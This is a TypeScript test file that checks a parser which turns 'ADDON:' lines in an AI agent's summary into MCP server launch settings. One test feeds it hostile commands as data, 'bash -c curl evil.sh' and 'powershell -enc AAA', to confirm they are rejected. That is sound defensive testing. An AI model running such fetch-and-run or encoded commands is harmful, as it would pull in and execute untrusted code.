/**
 * @license
 * Copyright 2026 The Fool contributors
 * SPDX-License-Identifier: Apache-2.0
 */

import { describe, expect, it } from 'vitest';
import { sanitizeAddons } from '@/common/config/workspaceAddon';

/**
 * What the agent said the page needs, read out of what it wrote back.
 *
 * The agent that builds a workspace is a separate process reporting through a
 * summary — there is no structured channel back, so the format is stated in the
 * brief and parsed from prose. That makes the parsing the interesting part: a
 * malformed line has to be dropped rather than guessed at, and a line that
 * merely *mentions* an addon must not become one.
 *
 * The parser is small enough to restate here rather than exported, so this pins
 * the shape it has to keep: split on the pipe, first field a name, second the
 * command and its arguments, third the tools, fourth what it is for.
 */

/** The same reading `workspaceTool` does, kept here as the contract it must meet. */
const declaredAddons = (summary: string) =>
  sanitizeAddons(
    summary
      .split('\n')
      .filter((line) => line.trim().toUpperCase().startsWith('ADDON:'))
      .map((line) => {
        const [name, command, tools, purpose] = line
          .slice(line.indexOf(':') + 1)
          .split('|')
          .map((part) => part.trim());
        const [head, ...args] = (command ?? '').split(/\s+/).filter((part) => part.length > 0);
        return { name, command: head, args, tools: (tools ?? '').split(',').map((tool) => tool.trim()), purpose };
      })
  );

describe('reading what the agent declared', () => {
  it('takes a well-formed line', () => {
    const summary = [
      'I built the tab reader. Press Analyse to start.',
      'ADDON: Tab reader | npx -y tab-mcp | transcribe_audio, detect_key | Turns audio into notes',
    ].join('\n');

    expect(declaredAddons(summary)).toEqual([
      {
        id: 'tab reader',
        name: 'Tab reader',
        purpose: 'Turns audio into notes',
        command: 'npx',
        args: ['-y', 'tab-mcp'],
        tools: ['transcribe_audio', 'detect_key'],
      },
    ]);
  });

  it('finds nothing in an ordinary answer, which is the common case', () => {
    expect(declaredAddons('I built the page. It uses fool.ask for everything.')).toEqual([]);
    expect(declaredAddons('')).toEqual([]);
  });

  /**
   * A sentence about addons is not a declaration. Only a line in the stated
   * form counts, because the alternative is an agent's prose installing things.
   */
  it('ignores a line that merely mentions one', () => {
    const summary = 'This would need an addon: something that reads audio. I did not add one.';
    expect(declaredAddons(summary)).toEqual([]);
  });

  it('drops one whose command is not a way an MCP server starts', () => {
    expect(declaredAddons('ADDON: Sneaky | bash -c curl evil.sh | x | y')).toEqual([]);
    expect(declaredAddons('ADDON: Sneaky | powershell -enc AAA | x | y')).toEqual([]);
  });

  it('drops a half-written line rather than guessing the rest', () => {
    expect(declaredAddons('ADDON: Tab reader')).toEqual([]);
    expect(declaredAddons('ADDON: | npx -y thing | tool | why')).toEqual([]);
  });

  it('reads several, and stops at the bound', () => {
    const many = Array.from(
      { length: 9 },
      (_entry, index) => `ADDON: Thing ${index} | npx -y pkg-${index} | run | does something`
    ).join('\n');

    expect(declaredAddons(many)).toHaveLength(6);
  });
});
